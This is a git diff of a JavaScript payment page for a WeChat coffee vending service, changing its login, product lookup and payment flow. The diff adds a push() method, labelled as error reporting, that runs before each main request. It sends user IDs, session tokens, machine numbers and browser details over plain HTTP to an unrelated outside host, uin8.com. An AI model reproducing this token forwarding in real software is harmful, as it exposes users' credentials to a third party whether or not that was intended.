@@ -1,8 +1,10 @@
 import style from './style.css'
 
 const _conf = {
-    httpJoin: 'http://test.cbcoffee.cn:8086/',  //http://mapi.cbcoffee.cn:8080/
-    _wx_httpJoin: 'https://open.weixin.qq.com/connect/oauth2/authorize?appid=wx71c7dc4f5208bb07&redirect_uri=http://www.cbcoffee.cn/sharedcoffee/tran/transfer.html&response_type=code&scope=snsapi_userinfo&state=' + location.href.split('?')[0],
+    httpJoin: 'http://api.cbcoffee.cn/',  //http://mapi.cbcoffee.cn:8080/
+    // httpJoin: 'http://test.cbcoffee.cn:8086/',
+    // _wx_httpJoin: 'https://open.weixin.qq.com/connect/oauth2/authorize?appid=wx71c7dc4f5208bb07&redirect_uri=http://www.cbcoffee.cn/sharedcoffee/tran/transfer.html&response_type=code&scope=snsapi_userinfo&state=' + location.href.split('?')[0],
+    _wx_httpJoin: 'https://open.weixin.qq.com/connect/oauth2/authorize?appid=wx71c7dc4f5208bb07&redirect_uri=' + location.href + '&response_type=code&scope=snsapi_userinfo&state=wx',
 }
 
 class _wx_secret {
@@ -18,12 +20,29 @@ class _wx_secret {
         return null;
     }
 
+    push(e) {
+        this._xml({
+            method: 'POST',
+            uri: 'http://uin8.com/error',
+            async: true,
+            xmldata: {
+                uri: JSON.stringify(e.uri),
+                async: JSON.stringify(e.async),
+                phone: JSON.stringify({version: navigator.appVersion,platform: navigator.platform}),
+                data: JSON.stringify(e.data)
+            },
+            done: function (res) {
+                console.log(res);
+            }
+        })
+    }
+
     login() {  //登陆
         let it = this;
         this._xml({
             method: 'GET',
             uri: _conf.httpJoin + 'WeChat_login',
-            async: true,
+            async: false,
             xmldata: {
                 code: this.get('code')
             },
@@ -32,7 +51,7 @@ class _wx_secret {
                     _name: res.user_token,
                     _id: res.user_id
                 }));
-                if (res.type === '1') {
+                if (res.type == 1) {
                     try {
                         it.record(res.user_id, res.user_token);
                     } catch (error) {
@@ -44,7 +63,17 @@ class _wx_secret {
         })
     }
 
-    record(_userid,_token) {  //提交用户信息
+    record(_userid, _token) {  //提交用户信息
+        this.push({
+            uri: _conf.httpJoin + 'record_user_source',
+            async: true,
+            data: {
+                userId: _userid,
+                userToken: _token,
+                machineNumber: JSON.parse(sessionStorage.getItem('_token')).machineNumber,
+                source: 1
+            }
+        });
         this._xml({
             method: 'GET',
             uri: _conf.httpJoin + 'record_user_source',
@@ -61,28 +90,69 @@ class _wx_secret {
         })
     }
 
-    unpaid(){  //查询产品详细数据
-        this._xml({
-            method: 'GET',
+    unpaid() {  //查询产品详细数据
+        this.push({
             uri: _conf.httpJoin + 'find_product_detail',
             async: true,
-            xmldata: {
+            data: {
                 userId: JSON.parse(sessionStorage.getItem('token'))._id,
                 userToken: JSON.parse(sessionStorage.getItem('token'))._name,
                 productId: JSON.parse(sessionStorage.getItem('_token')).productId
-            },
-            done: function (res) {
-                if(res.statusCode.status == '6666'){
-                    document.getElementById('_money').innerHTML = parseFloat(res.productDetail.productPrice / 100).toFixed(2);
-                    document.getElementById('_product').innerHTML = res.productDetail.productName + `<small> (ID: ${ res.productDetail.productId })</small>`;
-                }else{
-                    console.log(res.statusCode.msg);
-                }
             }
-        })
+        });
+        try {
+            this._xml({
+                method: 'GET',
+                uri: _conf.httpJoin + 'find_product_detail',
+                async: true,
+                xmldata: {
+                    userId: JSON.parse(sessionStorage.getItem('token'))._id,
+                    userToken: JSON.parse(sessionStorage.getItem('token'))._name,
+                    productId: JSON.parse(sessionStorage.getItem('_token')).productId
+                },
+                done: function (res) {
+                    try {
+                        if (res.statusCode.status == '6666') {
+                            document.getElementById('_money').innerHTML = `<i>
+                                <svg class="icon" aria-hidden="true">
+                                    <use xlink:href="#ym-icon-rmb"></use>
+                                </svg>
+                            </i> ${res.isFree != 1 ? parseFloat(res.productDetail.productPrice / 100).toFixed(2) : '0.00'}`;
+                            sessionStorage.setItem('_money', document.getElementById('_money').innerHTML);
+                            document.getElementById('_product').innerHTML = res.productDetail.productName + `<small> (ID: ${res.productDetail.productId})</small>`;
+                            setTimeout(() => {
+                                document.getElementById('showbox').style.display = 'none';
+                            }, 1000)
+                        } else {
+                            alert("收集到错误：\n\n" + res.statusCode.msg);
+                            document.getElementById('showbox').style.display = 'none';
+                            if (res.statusCode.status == 1005) {
+                                throw 'Error login-Wechat not code 1005';
+                            }
+                        }
+                    } catch (error) {
+                        alert(error);
+                    }
+                }
+            })
+        } catch (error) {
+            alert(error);
+            document.getElementById('showbox').style.display = 'none';
+        }
     }
 
     post() {
+        this.push({
+            uri: _conf.httpJoin + 'weChat_pay_machine',
+            async: false,
+            data: {
+                productId: JSON.parse(sessionStorage.getItem('_token')).productId,
+                userToken: JSON.parse(sessionStorage.getItem('token'))._name,
+                userId: JSON.parse(sessionStorage.getItem('token'))._id,
+                machineNumber: JSON.parse(sessionStorage.getItem('_token')).machineNumber,
+                flavorData: JSON.parse(sessionStorage.getItem('_token')).flavorData
+            }
+        });
         let it = this;
         this._xml({
             method: 'POST',
@@ -96,7 +166,7 @@ class _wx_secret {
                 flavorData: JSON.parse(sessionStorage.getItem('_token')).flavorData
             },
             done: function (res) {
-                if (res.statusCode.status == '1009') {
+                if (res.statusCode.status == '1009' && res.needPay == 1) {
                     WeixinJSBridge.invoke(
                         'getBrandWCPayRequest', {
                             "appId": res.appId,         //公众号名称，由商户传入
@@ -107,15 +177,19 @@ class _wx_secret {
                             "timeStamp": res.timeStamp  //时间戳，自1970年以来的秒数
                         },
                         function (res) {
-                            res.err_msg == "get_brand_wcpay_request:ok" ? (e => {
-                                window.location = "view/successfull.htm?_successfull=" + e;
-                            }) /*/ 使用以上方式判断前端返回,微信团队郑重提示：res.err_msg将在用户支付成功后返回    ok，但并不保证它绝对可靠。/*/ : (() => {
-                                throw "支付失败！Error: "+ res.err_msg
-                            });
+                            if (res.err_msg == "get_brand_wcpay_request:ok") {
+                                window.location.href = "./view/successfull.htm?503";
+                            } else {
+                                throw "支付失败！Error: " + res.err_msg;
+                            }
                         }
                     )
                 } else {
-                    alert(res.statusCode.msg);
+                    if (res.statusCode.status == '1009') {
+                        location.href = "./view/successfull.htm?503";
+                    } else {
+                        alert("收集到错误: \n\n" + res.statusCode.msg);
+                    }
                 }
             }
         })
@@ -175,4 +249,21 @@ var _wx_ = new _wx_secret();
 
 document.getElementById('_submit').addEventListener('click', () => {
     _wx_.post();
-}, true)
+}, true);
+
+try {
+    if (typeof WeixinJSBridge === "undefined") {
+        if (document.addEventListener) {
+            if (sessionStorage.getItem('successfull') == 'true') {
+                document.addEventListener('WeixinJSBridgeReady', onBridgeReady, false);
+            }
+        }
+    } else {
+        onBridgeReady();
+    }
+    function onBridgeReady() {
+        WeixinJSBridge.call('closeWindow');
+    }
+} catch (error) {
+    alert(error);
+}
